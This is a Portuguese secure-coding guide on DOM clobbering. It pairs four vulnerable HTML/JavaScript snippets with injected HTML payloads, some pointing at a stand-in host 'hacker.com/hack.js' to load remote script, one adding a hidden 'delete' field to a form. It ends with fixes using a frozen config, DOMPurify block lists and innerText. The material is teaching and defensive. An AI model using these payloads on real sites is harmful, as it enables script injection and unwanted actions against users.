# Code Examples: DOM Clobbering

## Exemplo 1: Clobbering basico com `name` em imagem

### Codigo vulneravel
```html
<!-- Seu codigo espera usar document.config -->
<script>
  const s = document.createElement('script')
  s.src = document.config.src
  document.head.appendChild(s)
</script>
```

### Ataque (injecao de HTML apenas)
```html
<img name="config" src="https://hacker.com/hack.js">
```

### O que acontece
`document.config` retorna o elemento `<img>` em vez da variavel esperada. `document.config.src` retorna `"https://hacker.com/hack.js"`, carregando script malicioso.

---

## Exemplo 2: Clobbering com hierarquia (form + img)

### Codigo vulneravel
```html
<script>
  const s = document.createElement('script')
  s.src = document.config.scriptToLoad.src
  document.head.appendChild(s)
</script>
```

### Ataque
```html
<form name="config">
  <img name="scriptToLoad" src="https://hacker.com/hack.js">
</form>
```

### O que acontece
`document.config` retorna o `<form>`. `document.config.scriptToLoad` retorna o `<img>` dentro do form. `.src` retorna a URL maliciosa.

---

## Exemplo 3: Sobrescrita de getElementById com tag body

### Codigo vulneravel
```html
<div id="resultado">23</div>
<script>
  const valor = document.getElementById('resultado').innerText
  alert(valor)
</script>
```

### Ataque
```html
<body>
  <div id="resultado">45</div>
</body>
<style>
  #resultado { display: none }
</style>
```

### O que acontece
Com CSS para esconder o div original e uma segunda tag body injetada, `getElementById('resultado')` pode retornar o elemento injetado com valor `45` em vez de `23`.

---

## Exemplo 4: Atributo `form` para injecao em formulario

### Codigo vulneravel
```html
<form id="meuForm">
  <input type="hidden" name="token" value="abc123">
  <button type="submit">Enviar</button>
</form>
```

### Ataque (fora do formulario)
```html
<input type="hidden" name="action" value="delete" form="meuForm">
```

### O que acontece
Mesmo estando fora do `<form>`, o input com `form="meuForm"` e enviado junto com o formulario. O servidor recebe `action=delete` sem que o usuario perceba.

---

## Correcao: Config em escopo local

```typescript
// SEGURO: impossivel sobrescrever via DOM
const config = Object.freeze({
  scriptToLoad: {
    src: '/scripts/meu-script.js'
  }
})
```

## Correcao: DOMPurify com restricoes

```typescript
import DOMPurify from 'dompurify'

const sanitizeConfig = {
  FORBID_ATTR: ['name', 'id', 'form'],
  FORBID_TAGS: ['form', 'input', 'button', 'textarea', 'select']
}

const cleanHTML = DOMPurify.sanitize(userInput, sanitizeConfig)
element.innerHTML = cleanHTML
```

## Correcao: Sempre preferir innerText

```typescript
// Para exibir conteudo do usuario, NUNCA use innerHTML
const userContent = getUserInput()
document.getElementById('output').innerText = userContent
```